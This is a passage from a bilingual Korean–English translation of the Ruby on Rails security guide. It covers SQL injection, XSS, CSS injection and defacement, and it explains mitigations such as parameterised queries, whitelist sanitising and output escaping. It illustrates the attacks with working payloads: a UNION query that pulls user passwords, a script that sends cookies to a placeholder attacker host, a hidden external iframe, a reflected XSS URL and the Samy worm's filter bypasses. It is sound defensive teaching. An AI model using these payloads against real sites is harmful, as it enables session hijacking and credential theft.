#### [Unauthorized Reading] 권한없이 읽기

UNION 문장은 두개의 SQL 쿼리를 연결해서 하나의 결과셋으로 데이터를 반환합니다. 공격자는 이것을 이용해서 데이터베이스로부터 임의의 데이터를 읽을 수 있습니다. 위에서 언급했던 예제 코드를 보겠습니다. [[[The UNION statement connects two SQL queries and returns the data in one set. An attacker can use it to read arbitrary data from the database. Let's take the example from above:]]]

```ruby
Project.where("name = '#{params[:name]}'")
```

그리고 UNION 문장을 이용해서 또 다른 쿼리를 주입해 봅시다. [[[And now let's inject another query using the UNION statement:]]]

```
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
```

이것은 다음과 같은 SQL 쿼리 결과를 만들어 줄 것입니다. [[[This will result in the following SQL query:]]]

```sql
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
```

쿼리 결과는 이름이 비어있는 프로젝트가 없기 때문에 반환되는 프로젝트 목록이 없고 대신에 사용자 이름과 비밀번호 목록이 될 것입니다. 따라서 이런 경우를 대비해서, 데이터베이스에서 저장할 때는 비밀번호를 암호화해야 합니다. 공격자에 입장에서 유일한 문제점은 컬럼의 수가 양쪽 쿼리에서 동일해야 한다는 것입니다. 이러한 이유로 두번째 쿼리문에 숫자 1 을 여러개 포함하게 되는데, 첫번째 쿼리의 컬럼 수와 일치시키 위해서 항상 1이라는 값을 가지게 될 것입니다. [[[The result won't be a list of projects (because there is no project with an empty name), but a list of user names and their password. So hopefully you encrypted the passwords in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That's why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.]]]

또한, 두번째 쿼리는 AS 문을 사용해서 컬럼명을 변경하게 되는 이로써 웹어플리케이션은 사용자 테이블로부터 값들을 표시하게 됩니다. 적어도 레일스 [2.1.1](http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/)로 업데이트 해야 합니다. [[[Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. Be sure to update your Rails [to at least 2.1.1](http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/).]]]

#### [Countermeasures] 대처방안

루비온레일스는 ' , " , NULL 문자, 개행문자와 같은 특수한 SQL 문자를 이스케이프하는 내장 필터를 가지고 있습니다. 따라서 <em class="highlight">`Model.find(id)` 또는 `Model.find_by_some thing(something)` 를 사용하면 이러한 조치들이 자동으로 적용됩니다</em>. 그러나 <em class="highlight">조건절(`where("...")`), `connection.execute()` 또는 `Model.find_by_sql()` 메소드와 같은 경우에는 SQL 부분에서 대해서 직접 수작업으로 적용시켜줘야 합니다</em>. [[[Ruby on Rails has a built-in filter for special SQL characters, which will escape ' , " , NULL character and line breaks. <em class="highlight">Using `Model.find(id)` or `Model.find_by_some thing(something)` automatically applies this countermeasure</em>. But in SQL fragments, especially <em class="highlight">in conditions fragments (`where("...")`), the `connection.execute()` or `Model.find_by_sql()` methods, it has to be applied manually</em>.]]]

조건절 옵션에 문자열을 넘겨주는 대신에, 아래와 같이 문제의 소지가 있는 문자열을 방지하기 위해서 배열을 넘겨 줄 수 있습니다. [[[Instead of passing a string to the conditions option, you can pass an array to sanitize tainted strings like this:]]]

```ruby
Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
```

보다시피, 배열의 첫번째 부분은 의문부호를 가진 SQL 문입니다. 배열의 두번째 부분에 있는 변수들은 의문부호를 대체하게 됩니다. 또는 동일한 결과에 대해서 해시를 넘겨 줄 수 있습니다. [[[As you can see, the first part of the array is an SQL fragment with question marks. The sanitized versions of the variables in the second part of the array replace the question marks. Or you can pass a hash for the same result:]]]

```ruby
Model.where(login: entered_user_name, password: entered_password).first
```

배열이나 해시 형태는 모델의 경우에만 사용 가능합니다. 그외에는 `sanitize_sql()` 메소드를 사용할 수 있습니다. _SQL 문에 외부 문자열을 사용할 경우에는 보안상의 문제가 없는지를 생각하는 습관을 들이도록 해야 합니다_. [[[The array or hash form is only available in model instances. You can try `sanitize_sql()` elsewhere. _Make it a habit to think about the security consequences when using an external string in SQL_.]]]

### [Cross-Site Scripting (XSS)] 사이트간 스크립팅(XSS)

INFO: _웹어플리케이션에서 가장 광범위하게 퍼져 있고 가장 치명적인 보안 취약성 중의 하나는 XSS입니다. 이러한 악성 공격은 클라이언트측 실행 코드를 주입하게 됩니다. 레일스는 이러한 공격을 방어하는 헬퍼메소드를 제공해 줍니다._ [[[_The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off._]]]

#### [Entry Points] 진입점

하나의 진입점은 공격자가 공격을 시작할 수 있는 URL과 파라미터입니다. [[[An entry point is a vulnerable URL and its parameters where an attacker can start an attack.]]]

가장 일반적인 진입점은 메시지 포스트, 사용자 댓글, 방명록이지만, 프로젝트 타이들, 문서명, 검색결과 페이지 역시 공격에 취약합니다. 사용자가 데이터를 입력할 수 있는 모든 곳이 공격 대상이 될 수 있습니다. 그러나 데이터 입력은 반드시 웹사이트의 입력창에서만 가능한 것이 아니라, 명시적이거나 숨겨졌거나 또는 내부에서 사용하는 어떠한 URL 파라미터를 통해서도 가능하다는 것입니다. 사용자는 어떠한 트래픽도 중간에서 가로챌 수 있다는 것을 기억해야 합니다. [Live HTTP Headers Firefox plugin](http://livehttpheaders.mozdev.org/)와 같은 어플리케이션이나 클라이언트측 프록시를 이용하면 쉽게 요청을 변경할 수 있습니다. [[[The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter - obvious, hidden or internal. Remember that the user may intercept any traffic. Applications, such as the [Live HTTP Headers Firefox plugin](http://livehttpheaders.mozdev.org/), or client-site proxies make it easy to change requests.]]]

XSS 공격은 다음과 같이 동작합니다. 공격자는 악성코드를 주입하고, 웹어플리케이션은 그것을 저장한 후, 웹 페이지상에 보여주게 됩니다. 결국 사용자는 이 페이지를 보게 되는 것입니다. 대부분의 XSS 사례는 단순히 경고창을 보여주지만 실제로는 매우 강력한 문제를 야기시키게 됩니다. XSS는 쿠키를 훔치고, 세션을 가로채고, 사용자를 가짜 웹사이트로 리디렉트시켜 공격자의 이득을 위해 만들어 놓은 광고에 노출되도록 합니다. 또한 웹사이트 상의 엘리먼트를 변경해서 개인 정보를 빼내거나 웹브라우저의 보안구멍을 통해서 악성소프트웨어를 설치하기도 합니다. [[[XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.]]]

2007년 후반기 동안, 모질라 브라우저에서는 88개, 사파리 22개, IE 18개, 오페라 12개의 취약성이 발견되었습니다. [Symantec Global Internet Security threat report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf)에서는 2007년 후반기에 239개의 브라우저 플러그인 취약성을 보고한 바도 있습니다. [Mpack](http://pandalabs.pandasecurity.com/mpack-uncovered/)은 이러한 취약성을 악용하는 매우 활발한 최신의 공격 프레임워크입니다. 범죄를 저지르는 해커들에게는, 웹어플리케이션 프레임워크 상의 SQL 주입 취약성을 악용해서 모든 텍스트 테이블 컬럼에 악성 코드를 삽입할 수 있다는 것은 매우 매력적인 것입니다. 2008년 4월, 51만개의 사이트가 이와 같은 공격을 당했는데, 이중에는 영국 정부, 유엔, 그 외 많은 주요 기관들이 포함되어 있습니다. [[[During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The [Symantec Global Internet Security threat report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf) also documented 239 browser plug-in vulnerabilities in the last six months of 2007. [Mpack](http://pandalabs.pandasecurity.com/mpack-uncovered/) is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high targets.]]]

비교적 새롭지만 드문 형태의 진입점은 배너 광고입니다. 2008년초, [Trend Micro](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/)에 의하면, 악성코드가 MySapce와 Excite와 같은 유명 사이트에 있는 배너 광고에서 나타났습니다. [[[A relatively new, and unusual, form of entry points are banner advertisements. In earlier 2008, malicious code appeared in banner ads on popular sites, such as MySpace and Excite, according to [Trend Micro](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/).]]]

#### [HTML/JavaScript Injection] HTML/자바스크립트 주입

가장 일반적인 XSS 언어는 당연히 가장 보편화되어 있는 클라이언트측 스크립팅 언어인 자바스크립트인데, 종종 HTML과 함께 코딩되기도 합니다. _사용자 입력을 이스케이핑하는 것은 필수적인 것입니다_. [[[The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. _Escaping user input is essential_.]]]

XSS를 체크할 수 가장 손쉬운 테스트가 아래 소개되어 있습니다. [[[Here is the most straightforward test to check for XSS:]]]

```html
<script>alert('Hello');</script>
```

이 자바스크립트 코드는 단순히 경고창을 보여줄 것입니다. 다음 예제코드는 매우 드문 위치에서 정확히 동일한 동작을 수행하게 됩니다. [[[This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:]]]

```html
<img src=javascript:alert('Hello')>
<table background="javascript:alert('Hello')">
```

##### [Cookie Theft] 쿠기 도둑

이상에서 보여준 예제 코드는 현재 상태에서는 전혀 피해를 주지 않았지만, 이제는 공격자가 사용자의 쿠키를 훔쳐서 세션을 가로채는 방법을 알아 보겠습니다. 자바스크립트에서는 document.cookie 속성을 이용해서 문서의 쿠키를 읽고 쓸수 있습니다. 자바스크립트는 same origin policy를 강제하는데, 특정 도메인의 스크립트는 다른 도메인의 쿠키를 접근할 수 없다는 것을 의미합니다. document.cookie 속성은 페이지를 응답으로 보낸 웹서버의 쿠키값을 가지고 있습니다. 그러나, XSS에서 일어나는 것처럼, HTML 문서내에 스크립트 코드를 직접 삽입해 둘 경우 이 속성값을 읽고 쓸수 있게 됩니다. 결과 페이지에서 쿠키값을 보고 싶을 때는 웹어플리케이션내의 아무곳에 아래의 코드를 주입해 주면 됩니다. [[[These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the user's session). In JavaScript you can use the document.cookie property to read and write the document's cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:]]]

```
<script>document.write(document.cookie);</script>
```

물론 공격자들에게는 희생자가 자신의 쿠키값을 볼 것이기 때문에 이와 같은 스크립트 코드는 유용하지 않습니다. 아래의 예제 코드는 http://www.attacker.com/ 주소에 쿠키값을 조합한 URL로부터 이미지를 로드하려고 시도할 것입니다. 물론, 이 URL은 존재하지 않기 때문에 브라우저상에 아무것도 보이지 않게 됩니다. 그러나 공격자는 자신의 웹서버의 접근 로그 파일에서 희생자의 쿠키값을 알 수 있게 됩니다. [[[For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review his web server's access log files to see the victim's cookie.]]]

```html
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
```

www.attacker.com 의 로그파일에서 아래와 같은 내용을 알 수 있을 것입니다. [[[The log files on www.attacker.com will read like this:]]]

```
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
```

[httpOnly](http://dev.rubyonrails.org/ticket/8895) 플래그를 쿠키에 추가해 주는 것과 같이 확실한 조치를 취해주면 이러한 공격을 줄일 수 있는데, 이렇게 하면 자바스크립트가 document.cookie를 읽을 수 없게 될 수 있습니다. Http only 쿠키는 IE v6.SP1, 파이어폭스 v2.0.0.5, 오페라 9.5 에서 사용하고 있지만, 사파리는 여전히 고려 중에 있고 해당 옵션을 무시해 버립니다. 그러나 WebTV와 IE 5.5 on Mac 과 같은 다른 구버전의 브라우저들은 실제로 해당 페이지를 로드하지 못할 수 있습니다. 그러나 쿠키는 [Ajax를 이용할 경우 여전히 보일 수 있기 때문](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/)에 주의가 필요합니다. [[[You can mitigate these attacks (in the obvious way) by adding the [httpOnly](http://dev.rubyonrails.org/ticket/8895) flag to cookies, so that document.cookie may not be read by JavaScript. Http only cookies can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies [will still be visible using Ajax](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/), though.]]]

##### [Defacement] 파손

웹페이지가 보안상 뚫리게 되면, 공격자가 많은 작업을 할 수 있게 됩니다. 예를 들면, 거짓 정보를 제공해 주고, 사용자를 공격자의 웹사이트로 유인해서 쿠키, 로그인 정보 또는 다른 개인정보를 훔칠 수 있습니다. 가장 일반적인 방법은 iframe을 이용해서 외부 소스로부터 코드를 포함하는 것입니다. [[[With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials or other sensitive data. The most popular way is to include code from external sources by iframes:]]]

```html
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
```

이로써 임의의 HTML이나 자바스크립트가 외로 소스로부터 로드되어 사이트의 일부로 임베드됩니다. 이 iframe은 [Mpack attack framework](http://isc.sans.org/diary.html?storyid=3015)
를 이용해서 합법적인 이태리 사이트에 대한 실제 공격으로부터 삽입된 것입니다. Mpack은 웹브라우저의 보안구멍을 통해서 악성 소프트웨어를 설치하려고 시도합니다. 이러한 공격은 매우 성공적으로 진행되어, 50% 정도의 성공율을 보입니다. [[[This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iframe is taken from an actual attack on legitimate Italian sites using the [Mpack attack framework](http://isc.sans.org/diary.html?storyid=3015). Mpack tries to install malicious software through security holes in the web browser - very successfully, 50% of the attacks succeed.]]]

더 특별한 공격의 경우는 전체 웹사이트를 공격자의 사이트로 겹치게 하거나, 원래의 사이트와 똑같은 로그인 폼을 보여주지만 사용자이름과 비밀번호를 공격자의 사이트로 전송하도록 할 수 있습니다. 또는 CSS와 자바스크립트를 이용해서 웹어플리케이션에 있는 원래의 링크를 감춰버리고 가짜 웹사이트로 리디렉트하는 다른 링크로 대신 보이게 할 수도 있을 것입니다. [[[A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site's original, but transmits the user name and password to the attacker's site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.]]]

"reflected" 주입공격은 악성코드가 사용자에게 나중에도 지속적으로 보여주기 위해서 저장되지 않고 URL에만 포함되는 방식입니다. 특히, 검색 폼은 검색 문자열을 이스케이핑하지 못합니다. 아래의 링크는 "George Bush appointed a 9 year old boy to be the chairperson..."로 기술된 페이지를 보여 줍니다. [[[Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":]]]

```
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
```

##### [Countermeasures] 대처방법

_악성 입력을 걸러내는 것이 매우 중요하지만 웹어플리케이션의 결과물을 이스케이핑하는 것 역시 중요합니다_. [[[_It is very important to filter malicious input, but it is also important to escape the output of the web application_.]]]

특히 XSS에 대처하기 위해서는, _블랙리스트 대신 화이트리스트 방식으로 입력을 필터하는 것이 중요합니다_. 화이트리스트 필터링이란 허용되지 않는 값에 반하여 허용되는 값만을 걸러내는 것을 말합니다. 블랙리스트는 결코 완벽할 수 없습니다. [[[Especially for XSS, it is important to do _whitelist input filtering instead of blacklist_. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete.]]]

특정 블랙리스트가 사용자의 입력으로부터 "script"라는 단어를 삭제한다고 가정해 보겠습니다. 이 때 공격자가 "&lt;scrscriptipt&gt;" 라는 문자열을 주입하고 이에 대해서 블랙리스트가 필터를 적용하면 이후에도 "&lt;script&gt;" 문자열이 남게되는 결과를 초래하게 됩니다. 레일스의 초기버전에서는 strip_tags(), strip_links(), sanitize() 메소드에 대해서 블랙리스트 접근법을 사용했었습니다. [[[Imagine a blacklist deletes "script" from the user input. Now the attacker injects "&lt;scrscriptipt&gt;", and after the filter, "&lt;script&gt;" remains. Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:]]]

```ruby
strip_tags("some<<b>script>alert('hello')<</b>/script>")
```

이것은 "some&lt;script&gt;alert('hello')&lt;/script&gt;"와 같은 값을 반환하게 되어 공격이 작동하는 결과를 낳게 되는 것입니다. 바로 이것이 업데이트된 레일스 2의 sanitize() 메소드를 이용할 때, 화이트리스트 방식에 대한 찬성표를 던지게 하는 이유입니다. [[[This returned "some&lt;script&gt;alert('hello')&lt;/script&gt;", which makes an attack work. That's why I vote for a whitelist approach, using the updated Rails 2 method sanitize():]]]

```ruby
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
```

이것은 주어진 태그들만 허용하는데, 온갖 트릭과 악성 태그에 대해서도 잘 동작합니다. [[[This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.]]]

두번째 단계로, _어플리케이션의 모든 출력물을 이스케이핑하는 습관을 들이는 것이 좋습니다_. 특히, 이전 예에 예로 든 검색폼에서와 같이 입력값을 필터하지 않은 경우, 사용자 입력값을 다시 보여줄 때 이러한 작업을 추가해 주어야 합니다. _`escapeHTML()` (또는 다름 이름인 `h()`) 메소드를 이용하면_, HTML (`&amp;`, `&quot;`, `&lt`;, and `&gt;`)로 해독되지 않은 형태로 HTML 입력 문자들(&amp;, &quot;, &lt;, &gt;)을 교체해 줄 수 있습니다. 그러나, 개발자가 이 메소드를 사용하는 것을 쉽게 기억하지 못할 수 있어서, _[SafeErb](http://safe-erb.rubyforge.org/svn/plugins/safe_erb/) 플러그인을 사용할 것을 권해 드립니다_. SafeErb는 외부소스로 부터 오는 문자열을 이스케이핑하는 것을 개발자에게 상기시켜 줍니다. [[[As a second step, _it is good practice to escape all output of the application_, especially when re-displaying user input, which hasn't been input-filtered (as in the search form example earlier on). _Use `escapeHTML()` (or its alias `h()`) method_ to replace the HTML input characters &amp;, &quot;, &lt;, &gt; by their uninterpreted representations in HTML (`&amp;`, `&quot;`, `&lt`;, and `&gt;`). However, it can easily happen that the programmer forgets to use it, so _it is recommended to use the [SafeErb](http://safe-erb.rubyforge.org/svn/plugins/safe_erb/) plugin_. SafeErb reminds you to escape strings from external sources.]]]

##### [Obfuscation and Encoding Injection] 코드난독화와 인코딩 주입

네트워크 트래픽은 주로 제한적인 서양 알파벳문자에 근거하고 있어서 다른 언어로 된 문자를 전송하기 위해서 유니코드와 같은 새로운 문자 인코딩이 출현하게 되었습니다. 그러나, 이것은 웹어플리케이션에게는 또한 위협적인 일이 됩니다. 즉, 웹브라우저는 처리하더라도 웹어플리케이션이 처리하지 못할 수 있는 다른 인코딩에서는 악성코드가  감춰질 수 있습니다. 아래에 UTF-8 인코딩에서 공격이 작동하는 코드 예를 보여 줍니다. [[[Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:]]]

```
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

이 예는 메시지 박스를 팝업으로 보여 줍니다. 그러나 위에서 언급했던 sanitize() 필터가 인식하게 될 것입니다. [Hackvertor](https://hackvertor.co.uk/public)는, 문자열을 읽기 어렵게 만들고 인코딩하는, 그래서 "적을 알게 되는", 훌륭한 툴입니다. 레일스의 sanitize() 메소드는 이러한 인코딩 공격을 훌륭하게 막아 줍니다. [[[This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus "get to know your enemy", is the [Hackvertor](https://hackvertor.co.uk/public). Rails' sanitize() method does a good job to fend off encoding attacks.]]]

#### [Examples from the Underground] 사례

_웹어플리케이션에 대한 오늘날 공격형태를 이해하기 위해서는, 몇가지 실제 공격매체를 살펴보는 것이 가장 좋습니다._ [[[_In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors._]]]

아래는 [Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) Yahoo! Mail [worm](http://groovin.net/stuff/yammer.txt) 에서 발췌한 것입니다. 2006년 6월 11일 발견되었고 최초의 웹메일 인터페이스 웜이였습니다. [[[The following is an excerpt from the [Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) Yahoo! Mail [worm](http://groovin.net/stuff/yammer.txt). It appeared on June 11, 2006 and was the first webmail interface worm:]]]

```
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
```

이 웜들은 야후의 HTML/자바스크립트 필터상에 구멍을 악용하게 되는데, 대개 이러한 필터는 모든 대상과 (자바스크립트도 있을 수 있기 때문에) 태그로부터의 onload 속성을 걸러주게 됩니다. 그러나 필터는 단 한번만 적용되기 때문에 웜코드가 있는 상태로 onload 속성이 그대로 유지됩니다. 바로 이것이 블랙리스트 필터가 결코 완전할 수 없는 이유에 해당하고, 왜 웹어플리케이션 상에 HTML/자바스크립트를 허용하는 것이 어려운 일인지를 잘 설명해 줍니다. [[[The worms exploits a hole in Yahoo's HTML/JavaScript filter, which usually filters all target and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why blacklist filters are never complete and why it is hard to allow HTML/JavaScript in a web application.]]]

개념증명을 위한 또 다른 웹메일 웜은, 4개의 이태리 웹메일 서비스에 대한 도메인간 웜인 Nduja 입니다. 더 자세한 내용은 [Rosario Valotta's paper](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/)을 참고하기 바랍니다. 위에서 언급한 두개의 웹메일 웜은 해커들의 돈벌이가 될 만한 것, 즉, 이메일 주소를 수집하는 것이 목적입니다. [[[Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on [Rosario Valotta's paper](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/). Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.]]]

2006년 12월에는, 34,000명의 사용자 이름과 비밀번호가 [MySpace phishing attack](http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html)로 도난 당했습니다. 이 공격의 방법은 "login_home_index_html" 이라는 프로필 페이지를 만드는 것이었고, URL은 보기에 매우 신빙성이 있어 보였습니다. 특수한 코딩 작업을 해 놓은 HTML과 CSS를 이용해서 페이지로부터 진짜 MySpace 내용은 감춰버리고 대신에 해커들이 만든 로그인 폼을 보이도록 했습니다. [[[In December 2006, 34,000 actual user names and passwords were stolen in a [MySpace phishing attack](http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html). The idea of the attack was to create a profile page named "login_home_index_html", so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.]]]

MySpace Samy 웜은 CSS 주입 섹션에서 언급할 것입니다. [[[The MySpace Samy worm will be discussed in the CSS Injection section.]]]

### [CSS Injection] CSS 주입

INFO: _CSS 주입은 실제로는 자바스크립트 주입이라할 수 있는데, IE, 사파리의 몇몇 버전, 그리고 기타 브라우저에서는 CSS내에서 자바스크립트를 허용하기 때문입니다. 따라서 웹어플리케이션에서 커스텀 CSS를 허용하는 문제는 두번 생각을 해야 합니다._ [[[_CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application._]]]

CSS 주입은 잘 알려진 웜인, [MySpace Samy worm](http://namb.la/popular/tech.html)를 예로 들면 잘 설명할 수 있습니다. 이 웜은 단지 Samy(공격자)의 프로필을 방문하는 것 만으로도 Samy에게 친구요청을 자동으로 보내게 됩니다. 수시간내에 1억개 이상의 친구요청을 받게 되어 MySpace에 대해 엄청난 트래픽을 유발하게 됩니다. 그래서 곧 이 사이트는 접속이 차단됩니다. 아래는 이 웜에 대한 기술적인 설명입니다. [[[CSS Injection is explained best by a well-known worm, the [MySpace Samy worm](http://namb.la/popular/tech.html). This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, but it creates too much traffic on MySpace, so that the site goes offline. The following is a technical explanation of the worm.]]]

MySpace는 많은 수의 태그를 블록하지만, CSS는 허용합니다. 그래서 웜을 만든 사람은 자바스크립트를 아래와 같이 CSS로 삽입할 수 있습니다. [[[MySpace blocks many tags, however it allows CSS. So the worm's author put JavaScript into CSS like this:]]]

```html
<div style="background:url('javascript:alert(1)')">
```

이와 같은 CSS 주입은 style 속성에서 이루어집니다. 그러나 CSS 주입내에는 이미 단일 인용부호와 이중 인용부가 이미 사용되었었기 때문에 단일 인용부호가 허용되지 않습니다. 그러나 자바스크립트는 손쉽게 사용할 수 있는 eval() 함수가 있어서 문자열을 코드로 실행할 수 있습니다. [[[So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript has a handy eval() function which executes any string as code.]]]

```html
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
```

eval() 함수는 style 속성을 허용하여 "innerHTML" 단어를 감추어 주기 때문에, 블랙리스트 입력 필터 입장에서는 악몽 같은 것입니다. [[[The eval() function is a nightmare for blacklist input filters, as it allows the style attribute to hide the word "innerHTML":]]]

```
alert(eval('document.body.inne' + 'rHTML'));
```

다음 문제는 MySpace가 "javascript" 단어를 필터링하는 것이었는데, 웜 작성자는 이를 회피하기 위해서 "java&lt;NEWLINE&gt;script" 같이 사용하였습니다. [[[The next problem was MySpace filtering the word "javascript", so the author used "java&lt;NEWLINE&gt;script" to get around this:]]]

```html
<div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')">
```

웜 작성자에게 있어서 또 다른 문제는 CSRF 보안 토큰이었습니다. 이 토큰이 없었다면 POST를 통해서 친구요청을 보낼 수 없었을 것입니다. 이 보안 토큰을 얻기 위해서 웜 작성자는 사용자를 추가하기 직전에 해당 페이지에 GET 요청을 보내어 그 결과에서 CSRF 토큰을 파싱해서 알아내는 방식으로 해결했습니다. [[[Another problem for the worm's author were CSRF security tokens. Without them he couldn't send a friend request over POST. He got around it by sending a GET to the page right before adding a user and parsing the result for the CSRF token.]]]

결국, 웜 작성자는 4KB 크기의 웜을 만들었고 이것을 자신의 프로파일 페이지로 주입했던 것입니다. [[[In the end, he got a 4 KB worm, which he injected into his profile page.]]]

[moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html) CSS 속성은, 파이어폭스와 같은 Gecko 기반의 브라우저에서 CSS에 자바스크립트를 삽입하는 또 다른 방법으로 밝혀졌습니다. [[[The [moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html) CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).]]]

#### [Countermeasures] 해결책

이 예는 블랙리스트 필터가 결코 완전하지 않다는 것을 다시 한번 보여 준 것입니다. 그러나, 웹어플리케이션에서 커스텀 CSS를 사용하는 것이 매우 드물 경우이기 때문에 필자는 화이트리스트 CSS 필터를 알지 못합니다. _커스텀 색상이나 이미지를 허용하는 경우에, 사용자는 색상이나 이미지를 선택하여 웹어플리케이션에서 CSS를 작성할 수 있게 되는 것입니다._ 이와 같이 커스텀 CSS를 허용해야 할 상황이라면, 화이트리스트 CSS 필터를 위해서 레일스의 `sanitize()` 메소드를 사용하기 바랍니다. [[[This example, again, showed that a blacklist filter is never complete. However, as custom CSS in web applications is a quite rare feature, I am not aware of a whitelist CSS filter. _If you want to allow custom colors or images, you can allow the user to choose them and build the CSS in the web application_. Use Rails' `sanitize()` method as a model for a whitelist CSS filter, if you really need one.]]]

### [Textile Injection] Textile 주입

보안상의 이유로 HTML 대신에 텍스트 포맷기능을 제공하고자 한다면, 서버사이트에서 HTML로 변환되는 마크업 언어를 사용하기 바랍니다. [RedCloth](http://redcloth.org/)는 그런 용도의 루비용 언어이지만, 유의해서 사용하지 않으면, 오히려 XSS에 취약해 질 수 있습니다. [[[If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. [RedCloth](http://redcloth.org/) is such a language for Ruby, but without precautions, it is also vulnerable to XSS.]]]

